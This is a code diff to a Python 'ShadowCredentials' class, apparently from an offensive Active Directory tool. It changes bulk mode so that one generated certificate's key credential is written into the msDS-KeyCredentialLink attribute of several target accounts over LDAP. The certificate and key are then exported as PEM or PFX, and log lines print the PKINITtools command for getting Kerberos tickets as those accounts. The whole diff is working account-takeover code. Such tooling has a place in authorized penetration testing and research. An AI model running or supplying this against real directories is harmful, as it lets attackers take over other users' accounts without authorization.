@@ -392,15 +392,24 @@ class ShadowCredentials(object):
         logger.info("Performing attempts to add msDS-KeyCredentialLink for a list of users")
         if type(self.target_samname) == str:
             self.target_samname = [self.target_samname]
-        for target in self.target_samname:
-            result = self.get_dn_sid_from_samname(target)
+        for samname in self.target_samname:
+            result = self.get_dn_sid_from_samname(samname)
             if not result:
-                #logger.error('Target account does not exist! (wrong domain?)')
+                continue
+            else:
+                certificate_dn = result[0]
+                certificate_samname = samname
+                break
+        certificate = X509Certificate2(subject=certificate_samname, keySize=2048, notBefore=(-40*365), notAfter=(40*365))
+        keyCredential = KeyCredential.fromX509Certificate2(certificate=certificate, deviceId=Guid(), owner=certificate_dn, currentTime=DateTime())
+        targets_owned = []
+        for samname in self.target_samname:
+            result = self.get_dn_sid_from_samname(samname)
+            if not result:
+                #logger.error(f'Target account does not exist! (wrong domain?): {samname}')
                 continue
             else:
                 self.target_dn = result[0]
-            certificate = X509Certificate2(subject=target, keySize=2048, notBefore=(-40*365), notAfter=(40*365))
-            keyCredential = KeyCredential.fromX509Certificate2(certificate=certificate, deviceId=Guid(), owner=self.target_dn, currentTime=DateTime())
             self.ldap_session.search(self.target_dn, '(objectClass=*)', search_scope=ldap3.BASE, attributes=['SAMAccountName', 'objectSid', 'msDS-KeyCredentialLink'])
             results = None
             for entry in self.ldap_session.response:
@@ -408,37 +417,37 @@ class ShadowCredentials(object):
                     continue
                 results = entry
             if not results:
-                #logger.error('Could not query target user properties')
+                #logger.error(f'Could not query target user properties: {samname}')
                 continue
             try:
                 new_values = results['raw_attributes']['msDS-KeyCredentialLink'] + [keyCredential.toDNWithBinary().toString()]
                 self.ldap_session.modify(self.target_dn, {'msDS-KeyCredentialLink': [ldap3.MODIFY_REPLACE, new_values]})
                 if self.ldap_session.result['result'] == 0:
-                    logger.success(f"Updated the msDS-KeyCredentialLink attribute of the target object: {target}")
-                    if path is None:
-                        path = target + '_' + ''.join(random.choice(string.ascii_letters + string.digits) for i in range(8))
-                        logger.verbose("No filename was provided. The certificate(s) will be stored with the filename: %s" % path)
-                    else:
-                        path = target + '_' + path
-                    if export_type == "PEM":
-                        certificate.ExportPEM(path_to_files=path)
-                        logger.success("Saved PEM certificate at path: %s" % path + "_cert.pem")
-                        logger.success("Saved PEM private key at path: %s" % path + "_priv.pem")
-                        logger.info("A TGT can now be obtained with https://github.com/dirkjanm/PKINITtools")
-                        logger.verbose("Run the following command to obtain a TGT")
-                        logger.verbose("python3 PKINITtools/gettgtpkinit.py -cert-pem %s_cert.pem -key-pem %s_priv.pem %s/%s %s.ccache" % (path, path, domain, target, path))
-                    elif export_type == "PFX":
-                        if password is None:
-                            password = ''.join(random.choice(string.ascii_letters + string.digits) for i in range(20))
-                            logger.verbose(f"No pass was provided. The certificate for {target} will be stored with the password: %s" % password)
-                        certificate.ExportPFX(password=password, path_to_file=path)
-                        logger.success("Saved PFX (#PKCS12) certificate & key at path: %s" % path + ".pfx")
-                        logger.info("Must be used with password: %s" % password)
-                        logger.info("A TGT can now be obtained with https://github.com/dirkjanm/PKINITtools")
-                        logger.verbose("Run the following command to obtain a TGT")
-                        logger.verbose("python3 PKINITtools/gettgtpkinit.py -cert-pfx %s.pfx -pfx-pass %s %s/%s %s.ccache" % (path, password, domain, target, path))
+                    targets_owned.append(samname)
+                    logger.success(f"Updated the msDS-KeyCredentialLink attribute of the target object: {samname}")
             except IndexError:
                 logger.info('Attribute msDS-KeyCredentialLink does not exist')
+        if targets_owned:
+            if path is None:
+                path = ''.join(random.choice(string.ascii_letters + string.digits) for i in range(8))
+                logger.verbose("No filename was provided. The certificate(s) will be stored with the filename: %s" % path)
+            if export_type == "PEM":
+                certificate.ExportPEM(path_to_files=path)
+                logger.success("Saved PEM certificate at path: %s" % path + "_cert.pem")
+                logger.success("Saved PEM private key at path: %s" % path + "_priv.pem")
+                logger.info("A TGT can now be obtained with https://github.com/dirkjanm/PKINITtools")
+                logger.verbose("Run the following command to obtain a TGT")
+                logger.verbose("python3 PKINITtools/gettgtpkinit.py -cert-pem %s_cert.pem -key-pem %s_priv.pem %s/%s %s.ccache" % (path, path, domain, self.target_samname, path))
+            elif export_type == "PFX":
+                if password is None:
+                    password = ''.join(random.choice(string.ascii_letters + string.digits) for i in range(20))
+                    logger.verbose(f"No pass was provided. The certificate will be stored with the password: %s" % password)
+                certificate.ExportPFX(password=password, path_to_file=path)
+                logger.success("Saved PFX (#PKCS12) certificate & key at path: %s" % path + ".pfx")
+                logger.info("Must be used with password: %s" % password)
+                logger.info("A TGT can now be obtained with https://github.com/dirkjanm/PKINITtools")
+                logger.verbose("Run the following command to obtain a TGT")
+                logger.verbose("python3 PKINITtools/gettgtpkinit.py -cert-pfx %s.pfx -pfx-pass %s %s/%s %s.ccache" % (path, password, domain, self.target_samname, path))
 
 
     def remove(self, device_id):
